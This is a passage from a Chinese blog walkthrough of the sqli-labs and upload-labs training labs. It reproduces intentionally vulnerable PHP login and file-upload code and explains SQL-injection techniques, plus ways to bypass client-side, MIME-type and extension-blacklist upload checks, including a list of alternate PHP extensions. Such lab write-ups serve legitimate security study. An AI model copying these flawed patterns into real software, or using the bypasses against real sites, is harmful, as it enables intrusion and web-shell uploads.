	<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>];

	<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
	<span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'User Name:'</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">"\n"</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'Password:'</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">"\n"</span>);
	<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);


	<span class="hljs-comment">// connectivity</span>
	<span class="hljs-variable">$uname</span>=<span class="hljs-string">'"'</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">'"'</span>;
	<span class="hljs-variable">$passwd</span>=<span class="hljs-string">'"'</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">'"'</span>; 
	@<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT username, password FROM users WHERE username=(<span class="hljs-subst">$uname</span>) and password=(<span class="hljs-subst">$passwd</span>) LIMIT 0,1"</span>;
	<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
	<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  		<span class="hljs-comment">//echo '&lt;font color= "#0000ff"&gt;';	</span>
  		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;
		<span class="hljs-comment">//echo " You Have successfully logged in " ;</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="3" color="#0000ff"&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Login name:'</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">'username'</span>];
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Password:'</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">'password'</span>];
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;	
		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span>  
	{
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;
		<span class="hljs-comment">//echo "Try again looser";</span>
		<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}
}

<span class="hljs-meta">?&gt;</span></code></pre>
<p>与上一关类似，不过闭合方式改为了双引号+括号的方式</p>
<h2 id="less-13">Less-13</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>]))
{
	<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>];
	<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>];

	<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
	<span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'User Name:'</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">"\n"</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'Password:'</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">"\n"</span>);
	<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);


	<span class="hljs-comment">// connectivity </span>
	@<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT username, password FROM users WHERE username=('<span class="hljs-subst">$uname</span>') and password=('<span class="hljs-subst">$passwd</span>') LIMIT 0,1"</span>;
	<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
	<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  		<span class="hljs-comment">//echo '&lt;font color= "#0000ff"&gt;';	</span>
  		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;
		<span class="hljs-comment">//echo " You Have successfully logged in " ;</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="3" color="#0000ff"&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-comment">//echo 'Your Login name:'. $row['username'];</span>
		<span class="hljs-comment">//echo "&lt;br&gt;";</span>
		<span class="hljs-comment">//echo 'Your Password:' .$row['password'];</span>
		<span class="hljs-comment">//echo "&lt;br&gt;";</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/flag.jpg"   /&gt;'</span>;	
		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span>  
	{
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;
		<span class="hljs-comment">//echo "Try again looser";</span>
		<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}
}

<span class="hljs-meta">?&gt;</span></code></pre>
<p>由于这里将查询结果的输出注释掉了，意味着我们无法进行联合注入。并且闭合方式改为了单引号+括号</p>
<h2 id="less-14">Less-14</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>]))
{
	<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>];
	<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>];

	<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
	<span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'User Name:'</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">"\n"</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'Password:'</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">"\n"</span>);
	<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);


	<span class="hljs-comment">// connectivity</span>
	<span class="hljs-variable">$uname</span>=<span class="hljs-string">'"'</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">'"'</span>;
	<span class="hljs-variable">$passwd</span>=<span class="hljs-string">'"'</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">'"'</span>; 
	@<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT username, password FROM users WHERE username=<span class="hljs-subst">$uname</span> and password=<span class="hljs-subst">$passwd</span> LIMIT 0,1"</span>;
	<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
	<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  		<span class="hljs-comment">//echo '&lt;font color= "#0000ff"&gt;';	</span>
  		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;
		<span class="hljs-comment">//echo " You Have successfully logged in " ;</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="3" color="#0000ff"&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-comment">//echo 'Your Login name:'. $row['username'];</span>
		<span class="hljs-comment">//echo "&lt;br&gt;";</span>
		<span class="hljs-comment">//echo 'Your Password:' .$row['password'];</span>
		<span class="hljs-comment">//echo "&lt;br&gt;";</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/flag.jpg" /&gt;'</span>;	
		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span>  
	{
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;
		<span class="hljs-comment">//echo "Try again looser";</span>
		<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/slap.jpg"  /&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}
}

<span class="hljs-meta">?&gt;</span></code></pre>
<p>与Less-13类似，只是闭合方式改为了双引号闭合</p>
<h2 id="less-15">Less-15</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//including the Mysql connect parameters.</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"../sql-connections/sql-connect.php"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// take the variables</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>]))
{
	<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'uname'</span>];
	<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>];

	<span class="hljs-comment">//logging the connection parameters to a file for analysis.</span>
	<span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'result.txt'</span>,<span class="hljs-string">'a'</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'User Name:'</span>.<span class="hljs-variable">$uname</span>);
	<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">'Password:'</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">"\n"</span>);
	<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);


	<span class="hljs-comment">// connectivity </span>
	@<span class="hljs-variable">$sql</span>=<span class="hljs-string">"SELECT username, password FROM users WHERE username='<span class="hljs-subst">$uname</span>' and password='<span class="hljs-subst">$passwd</span>' LIMIT 0,1"</span>;
	<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);
	<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);

	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
	{
  		<span class="hljs-comment">//echo '&lt;font color= "#0000ff"&gt;';	</span>
  		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#FFFF00" font size = 4&gt;'</span>;
		<span class="hljs-comment">//echo " You Have successfully logged in\n\n " ;</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font size="3" color="#0000ff"&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-comment">//echo 'Your Login name:'. $row['username'];</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-comment">//echo 'Your Password:' .$row['password'];</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;	
		
  		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;
  	}
	<span class="hljs-keyword">else</span>  
	{
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;
		<span class="hljs-comment">//echo "Try again looser";</span>
		<span class="hljs-comment">//print_r(mysql_error());</span>
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;	
		<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/font&gt;"</span>;  
	}
}

<span class="hljs-meta">?&gt;</span></code></pre>
<p>注释掉了mysql_error函数，这意味着我们只能进行布尔和时间盲注了。同时闭合方式为单引号</p>
<h1 id="0x02-upload-labs">0x02 upload-labs</h1>
<h2 id="pass-01">Pass-01</h2>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-keyword">var</span> file = document.<span class="hljs-title function_ invoke__">getElementsByName</span>(<span class="hljs-string">'upload_file'</span>)[<span class="hljs-number">0</span>].value;
    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">""</span>) {
        <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">"请选择要上传的文件!"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">//定义允许上传的文件类型</span>
    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">".jpg|.png|.gif"</span>;
    <span class="hljs-comment">//提取上传文件的类型</span>
    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_ invoke__">substring</span>(file.<span class="hljs-title function_ invoke__">lastIndexOf</span>(<span class="hljs-string">"."</span>));
    <span class="hljs-comment">//判断上传文件类型是否允许上传</span>
    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_ invoke__">indexOf</span>(ext_name + <span class="hljs-string">"|"</span>) == -<span class="hljs-number">1</span>) {
        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="hljs-string">"类型的文件,当前文件类型为："</span> + ext_name;
        <span class="hljs-title function_ invoke__">alert</span>(errMsg);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<p>可以看到，关键的file参数是从前端提取到的，如果file为指定的上述三种类型，则可以成功上传，如果不是指定类型，则会有个弹窗。</p>
<p>所有的操作都是在前端进行的，也就是说如果我们能绕过前端检验直接进行后端，就可以上传任意文件了。因为后端并没有进行任何检查。</p>
<p>这里绕过方式可以是：前端禁用js，或者bp抓包进入后端。</p>
<h3 id="前端禁用js">前端禁用js</h3>
<p>这里用F12禁用js，上传即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202124943235.png" alt="image-20240202124943235"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202125000700.png" alt="image-20240202125000700"></p>
<p>验证成功</p>
<h3 id="bp抓包">bp抓包</h3>
<p>首先上传一个后缀正确的文件，之后bp抓包随后修改后缀为php，如下图上传成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202125710395.png" alt="image-20240202125710395"></p>
<h2 id="pass-02">Pass-02</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/jpeg'</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/png'</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/gif'</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">'/'</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]            
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'文件类型不正确，请重新上传！'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>这里看到代码对文件type做出了限制，我们百度很容易搜到这样的信息：</p>
<pre><code class="hljs plaintext">$_FILES[myFile][name] 显示客户端文件的原名称。
$_FILES[myFile][type] 文件的 MIME 类型，例如image/gif。
$_FILES[myFile][size] 已上传文件的大小，单位为字节。
$_FILES[myFile][tmp_name] 储存的临时文件名，一般是系统默认。
$_FILES[myFile][error] 该文件上传的代码，PHP4.2版本后增加的</code></pre>
<p>因此我们bp修改MIME类型即可绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202131151851.png" alt="image-20240202131151851"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202131055820.png" alt="image-20240202131055820"></p>
<h2 id="pass-03">Pass-03</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'.asp'</span>,<span class="hljs-string">'.aspx'</span>,<span class="hljs-string">'.php'</span>,<span class="hljs-string">'.jsp'</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">'.'</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span>

        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) {
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) {
                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    }
}</code></pre>
<p>这里对上传的文件后缀进行了黑名单的过滤，但我们可以使用一些畸形（不常见的）后缀名进行绕过</p>
<p>如  php1、php2、php3、php4、php5、php7、pht、phtml、 phar、 phps、Asp、aspx、cer、cdx、 asa、asax、jsp、jspa、jspx等畸形后缀名。</p>
<p>前提条件：即Apache的httpd.conf有配置代码</p>
<p><code>AddType application/x-httpd-php .pht .phtml .phps .php5 .pht .</code></p>
<p>我们可以进入配置文件查看一下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202131635854.png" alt="image-20240202131635854"></p>
<p>那这里直接上传这里剩下的三个后缀即可绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202131958438.png" alt="image-20240202131958438"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202131822174.png" alt="image-20240202131822174"></p>
<p>成功上传</p>
<h2 id="pass-04">Pass-04</h2>
<pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {
